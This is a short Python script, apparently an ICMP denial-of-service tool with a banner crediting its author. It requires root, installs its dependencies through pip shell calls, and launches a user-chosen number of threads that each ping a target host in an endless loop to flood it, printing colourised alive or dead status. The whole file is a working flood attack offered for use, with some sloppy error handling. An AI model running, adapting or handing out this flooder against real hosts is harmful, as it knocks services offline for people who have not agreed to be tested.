try:
	import platform, threading, os, sys
	from colorama import Fore as f
	from icmplib import ping
	if os.getuid() == 0:
		print("root")
	else:
		print("Error!, pls run it as root!")
		exit()
except ImportError:
	os.system('pip3 install colorama')
	os.system('pip3 install icmplib')

def clear():
	if platform.system() == "Windows":
		os.system("cls")
	else:
		os.system("clear")

def icmp_dos():
	try:
		while True:
			global count
			count+=1
			host = ping(sys.argv[1], count=int(sys.argv[2]), interval=.1, timeout=1.5, privileged=True)
			if host.is_alive:
				print(f"({count}){f.BLUE}[{f.GREEN}Alive{f.BLUE}] {f.MAGENTA}Host: {f.CYAN}{host.address} {f.BLUE}| {f.MAGENTA}sent: {f.YELLOW}{host.packets_sent} {f.BLUE}| {f.MAGENTA}loss: {f.YELLOW}{host.packet_loss}{f.BLUE} |{f.MAGENTA} recv:{f.YELLOW} {host.packets_received}{f.WHITE}")
			else:
				print(f"({count}){f.BLUE}[{f.RED}Dead{f.BLUE}] {f.MAGENTA}Host: {f.CYAN}{host.address} {f.BLUE}| {f.MAGENTA}sent: {f.YELLOW}{host.packets_sent} {f.BLUE}| {f.MAGENTA}loss: {f.YELLOW}{host.packet_loss}{f.BLUE} |{f.MAGENTA} recv:{f.YELLOW} {host.packets_received}{f.WHITE}")
	except KeyboardInterrupt:
		print("Exiting...")
		exit()
	except:
		pass

def help():
	print(f"""
┏┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┓
│ ╭━━┳━━━┳━╮╭━┳━━━╮╭━━━╮╱╱╭━━━╮ │
│ ╰┫┣┫╭━╮┃┃╰╯┃┃╭━╮┃╰╮╭╮┃╱╱┃╭━╮┃ │
│ ╱┃┃┃┃╱╰┫╭╮╭╮┃╰━╯┃╱┃┃┃┣━━┫╰━━╮ │
│ ╱┃┃┃┃╱╭┫┃┃┃┃┃╭━┳┻━┫┃┃┃╭╮┣━━╮┃ │
│ ╭┫┣┫╰━╯┃┃┃┃┃┃┃╱╰━┳╯╰╯┃╰╯┃╰━╯┃ │
│ ╰━━┻━━━┻╯╰╯╰┻╯╱╱╱╰━━━┻━━┻━━━╯ │
│   By: Anikin Luke             │
┗┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┛
Usage: 
  python3 {os.path.basename(__file__)} <host> <packet_count> <power>
Example:
  python3 example.com 200 10
	""")
	exit()

def start():
	try:
		for i in range(int(sys.argv[3])):
			global count
			count+=1
			x = threading.Thread(target=icmp_dos).start()
	except KeyboardInterrupt:
		print("Exiting..")
		exit()
	except:
		pass


if __name__ == "__main__":
	clear()
	try:
		address = sys.argv[1]
		packet_count = int(sys.argv[2])
		power = int(sys.argv[3])
		count = 0
		start()
	except:
		help()
